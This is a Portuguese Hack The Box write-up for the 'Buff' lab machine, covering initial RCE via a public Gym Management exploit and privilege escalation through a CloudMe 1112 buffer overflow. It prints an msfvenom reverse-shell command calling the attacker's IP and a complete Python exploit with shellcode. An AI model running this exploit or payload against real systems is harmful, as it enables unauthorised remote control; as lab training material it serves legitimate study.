Enumeração de serviços:
![[Write-up/Hack The Box/Buff/img/Pasted image 20240303104103.png]]
Identificação do software instalado no website:
![[Write-up/Hack The Box/Buff/img/Pasted image 20240303104140.png]]
Com uma rápida pesquisa, descobrimos um exploit pra essa versão de software:
https://github.com/0xConstant/Gym-Management-1.0-unauthenticated-RCE/blob/main/exploit.py
E conseguimos um RCE no alvo:
![[Write-up/Hack The Box/Buff/img/Pasted image 20240303105139.png]]
Vamos pegar uma shell reversa enviando o nc.exe para o alvo e depois nos enviando o cmd.exe:
![[Write-up/Hack The Box/Buff/img/Pasted image 20240303105620.png]]
Navegando pelos diretórios, encontramos em Downloads o software CloudMe_1112.exe. Ao pesquisar na internet sobre, descobrimos uma vulnerabilidade de BoF na mesma versão encontrada.
Vamos confirmar se o mesmo está sendo executado no alvo:
![[Write-up/Hack The Box/Buff/img/Pasted image 20240303110634.png]]
Identificamos a porta 8888 aberta localmente, o que indica que o CloudMe está rodando.
Vamos então fazer o encaminhamento da porta 8888 para a máquina atacante:
![[Write-up/Hack The Box/Buff/img/Pasted image 20240303112730.png]]
Agora vamos gerar o shellcode com o payload:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.9 LPORT=2222 EXITFUNC=thread -b "\x00\x0d\x0a" -f python
```
E utilizamos o exploit encontrado para explorar o software vulnerável:
```python
import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

buf =  b""
buf += b"\xda\xcb\xd9\x74\x24\xf4\xbf\x1a\xdc\xd2\xa7\x5e"
buf += b"\x33\xc9\xb1\x52\x31\x7e\x17\x83\xc6\x04\x03\x64"
buf += b"\xcf\x30\x52\x64\x07\x36\x9d\x94\xd8\x57\x17\x71"
buf += b"\xe9\x57\x43\xf2\x5a\x68\x07\x56\x57\x03\x45\x42"
buf += b"\xec\x61\x42\x65\x45\xcf\xb4\x48\x56\x7c\x84\xcb"
buf += b"\xd4\x7f\xd9\x2b\xe4\x4f\x2c\x2a\x21\xad\xdd\x7e"
buf += b"\xfa\xb9\x70\x6e\x8f\xf4\x48\x05\xc3\x19\xc9\xfa"
buf += b"\x94\x18\xf8\xad\xaf\x42\xda\x4c\x63\xff\x53\x56"
buf += b"\x60\x3a\x2d\xed\x52\xb0\xac\x27\xab\x39\x02\x06"
buf += b"\x03\xc8\x5a\x4f\xa4\x33\x29\xb9\xd6\xce\x2a\x7e"
buf += b"\xa4\x14\xbe\x64\x0e\xde\x18\x40\xae\x33\xfe\x03"
buf += b"\xbc\xf8\x74\x4b\xa1\xff\x59\xe0\xdd\x74\x5c\x26"
buf += b"\x54\xce\x7b\xe2\x3c\x94\xe2\xb3\x98\x7b\x1a\xa3"
buf += b"\x42\x23\xbe\xa8\x6f\x30\xb3\xf3\xe7\xf5\xfe\x0b"
buf += b"\xf8\x91\x89\x78\xca\x3e\x22\x16\x66\xb6\xec\xe1"
buf += b"\x89\xed\x49\x7d\x74\x0e\xaa\x54\xb3\x5a\xfa\xce"
buf += b"\x12\xe3\x91\x0e\x9a\x36\x35\x5e\x34\xe9\xf6\x0e"
buf += b"\xf4\x59\x9f\x44\xfb\x86\xbf\x67\xd1\xae\x2a\x92"
buf += b"\xb2\xda\xa0\x92\x4b\xb3\xb6\xaa\x43\xed\x3e\x4c"
buf += b"\x39\xe1\x16\xc7\xd6\x98\x32\x93\x47\x64\xe9\xde"
buf += b"\x48\xee\x1e\x1f\x06\x07\x6a\x33\xff\xe7\x21\x69"
buf += b"\x56\xf7\x9f\x05\x34\x6a\x44\xd5\x33\x97\xd3\x82"
buf += b"\x14\x69\x2a\x46\x89\xd0\x84\x74\x50\x84\xef\x3c"
buf += b"\x8f\x75\xf1\xbd\x42\xc1\xd5\xad\x9a\xca\x51\x99"
buf += b"\x72\x9d\x0f\x77\x35\x77\xfe\x21\xef\x24\xa8\xa5"
buf += b"\x76\x07\x6b\xb3\x76\x42\x1d\x5b\xc6\x3b\x58\x64"
buf += b"\xe7\xab\x6c\x1d\x15\x4c\x92\xf4\x9d\x6c\x71\xdc"
buf += b"\xeb\x04\x2c\xb5\x51\x49\xcf\x60\x95\x74\x4c\x80"
buf += b"\x66\x83\x4c\xe1\x63\xcf\xca\x1a\x1e\x40\xbf\x1c"
buf += b"\x8d\x61\xea"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + buf))	

buf = padding1 + EIP + NOPS + buf + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
            
```
Ao executar conseguimos a shell reversa do administrador:
![[Write-up/Hack The Box/Buff/img/Pasted image 20240303113431.png]]